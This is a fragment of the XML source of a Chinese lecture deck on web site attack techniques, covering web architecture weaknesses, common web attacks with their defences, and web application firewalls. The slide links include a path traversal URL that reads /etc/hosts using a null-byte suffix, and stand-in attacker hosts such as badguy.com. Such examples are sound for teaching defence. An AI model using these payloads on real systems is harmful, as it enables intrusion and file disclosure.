            <a:fld id="{00651A7E-C721-4544-8D2F-3546C0565F84}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6"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p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{2C21E245-20D5-4D11-AD9A-5B593160C07A}"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CB3E5F7E-5148-4CB2-963A-95C37528F550}"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EF68ED92-367B-4CD8-A26C-4E6248EAD48D}"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1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{E565DC17-A35B-464B-A9AB-82DCA891CFF2}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 12"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>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p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{CBA975A5-F217-4B48-B315-600F055D9787}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN">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55650" y="228600"/>
            <a:ext cx="6407150" cy="563563"/>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457200" y="1143000"/>
            <a:ext cx="8229600" cy="5257800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="灯片编号占位符 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3429000" y="6597650"/>
            <a:ext cx="2133600" cy="263525"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{134E473F-4845-4315-9B13-28BC806CA207}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>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l">
              <a:defRPr kumimoji="0" sz="1400" b="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{2812D72D-DA04-4C9C-9A6E-C01386CD88CE}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2"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kumimoji="0" sz="1400" b="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{38C58080-A4A9-4607-B318-5D24794E2C9C}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>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ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" b="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2"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ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>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anose="02020603050405020304"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anose="02020603050405020304"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badguy.com/info.pl" TargetMode="Externa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2.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image36.jpeg"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image35.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image" Target="../media/image45.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3.png"/><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image" Target="../media/image50.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2.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.cn/example/ex.php?template=../../../../etc/hosts%00" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5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hacker.com/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image59.jpeg"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.jpe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63.jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image62.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65.jpeg"/></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4.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image73.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5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image" Target="../media/image76.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155.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87.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide1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89.png"/></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90.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide1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91.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide1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8.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image92.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93.jpe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16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02.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image101.png"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image100.wmf"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image99.png"/><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image" Target="../media/image108.png"/></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image" Target="../media/image109.png"/></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image" Target="../media/image114.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116.png"/></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image" Target="../media/image118.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide186.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide71.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image121.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image120.jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image119.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide187.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image" Target="../media/image123.jpeg"/></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124.jpeg"/></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125.jpeg"/></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196.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2.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image63.jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image62.png"/></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200.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide85.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image131.png"/><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image" Target="../media/image128.png"/></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image" Target="../media/image132.png"/></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image" Target="../media/image133.png"/></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image" Target="../media/image134.png"/></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135.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide205.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2.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image137.jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image136.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide206.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide91.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><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image" Target="../media/image138.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide207.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide92.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image142.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image141.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image139.png"/></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image" Target="../media/image143.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide2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7.jpeg"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide210.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image" Target="../media/image144.png"/></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image" Target="../media/image145.png"/></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image" Target="../media/image146.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide216.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image" Target="../media/image147.png"/></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1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a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="897254" y="1295400"/>
            <a:ext cx="7987666" cy="973932"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>第 十一 章    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网站攻击技术</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60418" name="Rectangle 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5" name="图片 4" descr="27182921_0868.jpg"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2085975" y="3395663"/>
            <a:ext cx="4829175" cy="24907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7666" name="Line 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1553830" y="4011796"/>
            <a:ext cx="6253738" cy="31621"/>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1" name="Rectangle 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1261728" y="190030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72" name="Text Box 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1338692" y="1939988"/>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1</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1777673" name="Line 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1536366" y="2482360"/>
            <a:ext cx="6253738" cy="24365"/>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4" name="Text Box 10"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2104691" y="1851715"/>
            <a:ext cx="5685413" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6600"/>
          </a:solidFill>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>应用体系结构脆弱性分析</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777675" name="Text Box 11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2122155" y="3421583"/>
            <a:ext cx="5702877" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>常见</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>应用攻击及防范</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777676" name="Rectangle 12"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>内容提纲</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777679" name="Rectangle 15"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1279192" y="3448105"/>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80" name="Text Box 16"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1356156" y="3468742"/>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2</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24" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1242678" y="5134070"/>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25" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2122155" y="5157837"/>
            <a:ext cx="5685413" cy="579437"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>应用防火墙</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>WAF</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0"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 Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1346628" y="5165820"/>
            <a:ext cx="301686" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Line 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1522078" y="5673819"/>
            <a:ext cx="6268026" cy="46037"/>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Tree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:push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r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>应用程序</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>体系结构</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408580" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="107950" y="3213100"/>
            <a:ext cx="8636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b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>客户端  </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408581" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3059113" y="3213100"/>
            <a:ext cx="1008062"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b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>服务器 </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408582" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4716463" y="2276475"/>
            <a:ext cx="10795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b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
